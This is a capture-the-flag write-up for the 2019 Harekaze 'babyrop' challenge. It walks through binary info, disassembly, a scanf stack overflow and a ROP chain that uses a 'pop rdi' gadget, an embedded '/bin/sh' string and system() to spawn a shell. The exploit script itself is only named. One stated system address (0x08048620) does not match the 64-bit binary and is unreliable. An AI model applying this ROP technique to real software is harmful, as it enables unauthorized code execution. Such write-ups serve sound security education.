# 2019 Harekaze - Babyrop

## Vulnerability

Info shows NX true, no canary, partial RELRO, ELF64 binary:

```
$ rabin2 -I babyrop 
arch     x86
... snip ...
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
... snip ...
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

When we run it, we are prompted with an input which is echoed back:

```
$ ./babyrop 
What's your name? aa
Welcome to the Pwn World, aa!
```

Let's move to disassembly:

```
sym.main (int argc, char **argv, char **envp);
|           ; var int local_10h @ rbp-0x10
|           ; DATA XREF from entry0 (0x4004fd)
|           0x004005d6      55             push rbp
|           0x004005d7      4889e5         mov rbp, rsp
|           0x004005da      4883ec10       sub rsp, 0x10
|           0x004005de      bfa8064000     mov edi, str.echo__n__What_s_your_name ; 0x4006a8 ; "echo -n \"What's your name? \""
|           0x004005e3      e8a8feffff     call sym.imp.system         ; int system(const char *string)
|           0x004005e8      488d45f0       lea rax, qword [local_10h]
|           0x004005ec      4889c6         mov rsi, rax
|           0x004005ef      bfc5064000     mov edi, 0x4006c5
|           0x004005f4      b800000000     mov eax, 0
|           0x004005f9      e8c2feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|           0x004005fe      488d45f0       lea rax, qword [local_10h]
|           0x00400602      4889c6         mov rsi, rax
|           0x00400605      bfc8064000     mov edi, str.Welcome_to_the_Pwn_World___s ; 0x4006c8 ; "Welcome to the Pwn World, %s!\n"
|           0x0040060a      b800000000     mov eax, 0
|           0x0040060f      e88cfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400614      b800000000     mov eax, 0
|           0x00400619      c9             leave
\           0x0040061a      c3             ret
```

The disassembly shows the use of `scanf` with `local_10h` and `0x4006c5` as format:

```
[0x004004e0]> x/10x 0x4006c5
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x004006c5  2573 0057 656c 636f 6d65                 %s.Welcome
```

Great! This is the most basic buffer overflow with system function already imported (`0x004005e3` call in the `sym.main` disassembly suggests that)

## Building ROP chain

OK, so the system function is in the .plt section at `0x08048620`. We can jump to it immediately when exiting main but we need to set the "/bin/sh" as first parameter. Let's see if we are lucky:

```
[0x004004e0]> iz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000006a8 0x004006a8  28  29 (.rodata) ascii echo -n "What's your name? "
001 0x000006c8 0x004006c8  30  31 (.rodata) ascii Welcome to the Pwn World, %s!\n
000 0x00001048 0x00601048   7   8 (.data) ascii /bin/sh
```

Yep. The "/bin/sh" string is already in the binary at `0x00601048` so we just need the appropriate `pop rdi` instruction we can jump to first to put the address of /bin/sh to rdi making it the first parameter.

```
$ python ../ROPgadget/ROPgadget.py --binary babyrop | grep "pop rdi"
0x0000000000400683 : pop rdi ; ret
```

Perfect. All is in place, the idea is to overflow the rip register with address of `pop rdi` instruction, pop the /bin/sh address to rdi register and jump to system function which will execute and give us a shell. The complete solution to this task is `solve_2019_harekaze_babyrop.py`.
